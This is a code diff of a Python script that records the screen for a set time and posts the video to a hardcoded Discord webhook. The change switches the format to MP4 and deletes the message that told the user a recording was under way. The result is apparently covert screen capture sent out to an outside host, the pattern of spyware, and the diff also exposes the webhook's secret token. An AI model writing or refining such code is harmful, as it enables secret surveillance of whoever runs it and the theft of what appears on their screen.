@@ -6,7 +6,6 @@ import pyautogui
 import cv2
 import numpy as np
 import requests
-from datetime import datetime
 
 def install_packages():
     """Install required packages."""
@@ -22,7 +21,7 @@ def upload_video_to_discord(video_path):
     """Upload the video file to Discord via webhook."""
     webhook_url = 'https://discord.com/api/webhooks/1268235871740624977/T4pFfcwPV3L8dZVIQ4FqVzJOTClnyPtxkr20A8iYOz7GVzlkOsTKhwoSy63ij848tZOM'
     with open(video_path, 'rb') as video_file:
-        files = {'file': ('recording.avi', video_file, 'video/x-msvideo')}
+        files = {'file': ('recording.mp4', video_file, 'video/mp4')}
         response = requests.post(webhook_url, files=files)
     if response.status_code == 204:
         print("Video successfully uploaded to Discord.")
@@ -36,11 +35,9 @@ def record_screen(duration=20):
     width, height = screen_size.width, screen_size.height
 
     # Define the codec and create a VideoWriter object
-    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-    video_path = 'screen_recording.avi'
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Use 'mp4v' for MP4 files
+    video_path = 'screen_recording.mp4'
     out = cv2.VideoWriter(video_path, fourcc, 20.0, (width, height))
-
-    print(f"Recording for {duration} seconds... Press Ctrl+C to stop.")
 
     start_time = time.time()
     try:
@@ -88,3 +85,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
